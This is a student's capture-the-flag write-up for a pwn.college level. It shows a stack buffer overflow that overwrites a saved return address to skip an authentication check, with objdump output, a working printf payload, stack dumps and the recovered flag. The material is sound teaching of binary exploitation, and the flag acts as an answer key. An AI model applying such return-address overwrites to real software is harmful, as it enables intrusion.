# Binary Exploitation

## Tricky Control Hijack (easy)
Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from getting the flag!

### Solve
**Flag:** `pwn.college{0dn4h53CiqG538VSmNkDnMTd104.dlTOywCM4EzNzEzW}`

The file "binary-exploitation-control-hijack-2-w" was in the challenge directory, so we used cd command to go there. Then, "./binary-exploitation-control-hijack-2-w" was executed, which gave the description and instructions of the challenge. It was told that we need to force execute the win-authed function by directly overflowing into the stored return address back to main which 152 bytes after the start of the input buffer. It was also said that along with this we need 8 more bytes to overwrite the return address. The return address must be overwritten with value of a specific address which can be found using "objdump" command as, "objdump -d ./binary-exploitation-control-hijack-2-w" which gave the output as shown below. From this, we got the address to be 401d74(Since this is the first instruction executed if the comparison passes (i.e., the token equals $0x1337$). It sets up the string "You win! Here is your flag:" to be printed.). Therefore, the code to execute the function is "( printf 'A%.0s' {1..152}; printf '\x74\x1d\x40\x00\x00\x00\x00\x00' ) | ./binary-exploitation-control-hijack-2-w". Executing this, gave the output as the flag.

```bash
hacker@binary-exploitation~tricky-control-hijack-easy:/challenge$ objdump -d ./binary-exploitation-control-hijack-2-w 
0000000000401d58 <win_authed>:
  401d58:	f3 0f 1e fa          	endbr64
  401d5c:	55                   	push   %rbp
  401d5d:	48 89 e5             	mov    %rsp,%rbp
  401d60:	48 83 ec 10          	sub    $0x10,%rsp
  401d64:	89 7d fc             	mov    %edi,-0x4(%rbp)
  401d67:	81 7d fc 37 13 00 00 	cmpl   $0x1337,-0x4(%rbp)
  401d6e:	0f 85 fe 00 00 00    	jne    401e72 <win_authed+0x11a>
  401d74:	48 8d 3d 75 13 00 00 	lea    0x1375(%rip),%rdi        # 4030f0

hacker@binary-exploitation~tricky-control-hijack-easy:/challenge$ ( printf 'A%.0s' {1..152}; printf '\x74\x1d\x40\x00\x00\x00\x00\x00' ) | ./binary-exploitation-control-hijack-2-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff7cb3a750 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007fff7cb3a758 (rsp+0x0008) | 38 b9 b3 7c ff 7f 00 00 | 0x00007fff7cb3b938 |
| 0x00007fff7cb3a760 (rsp+0x0010) | 28 b9 b3 7c ff 7f 00 00 | 0x00007fff7cb3b928 |
| 0x00007fff7cb3a768 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007fff7cb3a770 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a778 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a780 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a788 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a790 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a798 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a7a0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a7a8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a7b0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a7b8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a7c0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a7c8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a7d0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a7d8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a7e0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a7e8 (rsp+0x0098) | 00 b8 b3 7c ff 7f 00 00 | 0x00007fff7cb3b800 |
| 0x00007fff7cb3a7f0 (rsp+0x00a0) | 90 11 40 00 00 00 00 00 | 0x0000000000401190 |
| 0x00007fff7cb3a7f8 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff7cb3a800 (rsp+0x00b0) | 30 b8 b3 7c ff 7f 00 00 | 0x00007fff7cb3b830 |
| 0x00007fff7cb3a808 (rsp+0x00b8) | 26 25 40 00 00 00 00 00 | 0x0000000000402526 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7fff7cb3a750, and our base pointer points to 0x7fff7cb3a800.
This means that we have (decimal) 24 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 192 bytes.
The input buffer begins at 0x7fff7cb3a770, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 121 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win_authed() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7fff7cb3a808, 152 bytes after the start of your input buffer.
That means that you will need to input at least 160 bytes (121 to fill the buffer,
31 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7fff7cb3a770 (the start of the input buffer)
right up to (but not including) 0x7fff7cb3b770 (which is 3975 bytes beyond the end of the buffer).
Of these, you will overwrite 3944 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

One caveat in this challenge is that the win_authed() function must first auth:
it only lets you win if you provide it with the argument 0x1337.
Speifically, the win_authed() function looks something like:
    void win_authed(int token)
    {
      if (token != 0x1337) return;
      puts("You win! Here is your flag: ");
      sendfile(1, open("/flag", 0), 0, 256);
      puts("");
    }

So how do you pass the check? There *is* a way, and we will cover it later,
but for now, we will simply bypass it! You can overwrite the return address
with *any* value (as long as it points to executable code), not just the start
of functions. Let's overwrite past the token check in win!

To do this, we will need to analyze the program with objdump, identify where
the check is in the win_authed() function, find the address right after the check,
and write that address over the saved return address.

Go ahead and find this address now. When you're ready, input a buffer overflow
that will overwrite the saved return address (at 0x7fff7cb3a808, 152 bytes into the buffer)
with the correct value.

Send your payload (up to 4096 bytes)!
You sent 160 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff7cb3a750 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007fff7cb3a758 (rsp+0x0008) | 38 b9 b3 7c ff 7f 00 00 | 0x00007fff7cb3b938 |
| 0x00007fff7cb3a760 (rsp+0x0010) | 28 b9 b3 7c ff 7f 00 00 | 0x00007fff7cb3b928 |
| 0x00007fff7cb3a768 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007fff7cb3a770 (rsp+0x0020) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a778 (rsp+0x0028) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a780 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a788 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a790 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a798 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a7a0 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a7a8 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a7b0 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a7b8 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a7c0 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a7c8 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a7d0 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a7d8 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a7e0 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a7e8 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a7f0 (rsp+0x00a0) | 41 41 41 41 a0 00 00 00 | 0x000000a041414141 |
| 0x00007fff7cb3a7f8 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a800 (rsp+0x00b0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff7cb3a808 (rsp+0x00b8) | 74 1d 40 00 00 00 00 00 | 0x0000000000401d74 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fff7cb3a770
- the saved frame pointer (of main) is at 0x7fff7cb3a800
- the saved return address (previously to main) is at 0x7fff7cb3a808
- the saved return address is now pointing to 0x401d74.
- the address of win_authed() is 0x401d58.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{0dn4h53CiqG538VSmNkDnMTd104.dlTOywCM4EzNzEzW}
```

### New Learnings
-> The objdump command in Linux is a utility used to display information about object files, including executables, libraries, and object files generated during compilation. It is part of the GNU Binary Utilities (binutils) and is primarily used for debugging, reverse engineering, and analyzing the structure of compiled code.

### References 
https://crypto.stanford.edu/cs155old/cs155-spring16/lectures/02-ctrl-hijacking.pdf
